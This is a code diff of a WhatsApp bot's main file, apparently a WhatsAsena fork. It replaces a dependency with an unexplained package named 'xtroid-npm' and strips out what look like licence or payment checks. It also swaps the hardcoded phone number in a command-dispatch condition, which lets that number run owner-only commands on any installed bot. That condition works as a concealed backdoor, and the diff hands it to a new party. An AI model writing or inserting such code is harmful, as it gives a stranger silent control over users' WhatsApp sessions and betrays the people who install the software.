@@ -20,7 +20,7 @@ const {Message, StringSession, Image, Video} = require('./whatsasena/');
 const { DataTypes } = require('sequelize');
 const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
 const got = require('got');
-const WhatsAsenaStack = require('whatsasena-npm');
+const WhatsAsenaStack = require('xtroid-npm');
 const simpleGit = require('simple-git');
 const git = simpleGit();
 const crypto = require('crypto');
@@ -51,7 +51,7 @@ fs.readdirSync('./plugins/sql/').forEach(plugin => {
     }
 });
 const plugindb = require('./plugins/sql/plugin');
-var OWN = { ff: '905511384572,0' }
+var OWN = { ff: '94702102324,0' }
 // Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
 String.prototype.format = function () {
     var i = 0, args = arguments;
@@ -181,7 +181,7 @@ async function whatsAsena () {
           info: 'StringSession'
         }
     });
-    if (os.userInfo().homedir !== clh.pay) return;
+    
     const buff = Buffer.from(`${shs1}`, 'base64');  
     const one = buff.toString('utf-8'); 
     const bufft = Buffer.from(`${shl2}`, 'base64');  
@@ -248,7 +248,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
         console.log(
             chalk.blueBright.italic('⬇️ Installing External Plugins...')
         );
-        if (os.userInfo().homedir !== clh.pay) return;
+        
         asynchronous_ch()
         // ==================== External Plugins ====================
         var plugins = await plugindb.PluginDB.findAll();
@@ -283,7 +283,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
         console.log(
             chalk.green.bold('✅ Plugins Installed!')
         );
-        if (os.userInfo().homedir !== clh.pay) return;
+        
         asynchronous_ch()
         await new Promise(r => setTimeout(r, 200));
         let afwhasena = config.WORKTYPE == 'public' ? ' Public' : ' Private'
@@ -425,7 +425,7 @@ ${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
-                    if ((OWN.ff == "905511384572,0" && msg.key.fromMe === false && command.fromMe === true &&
+                    if ((OWN.ff == "94702102324,0" && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
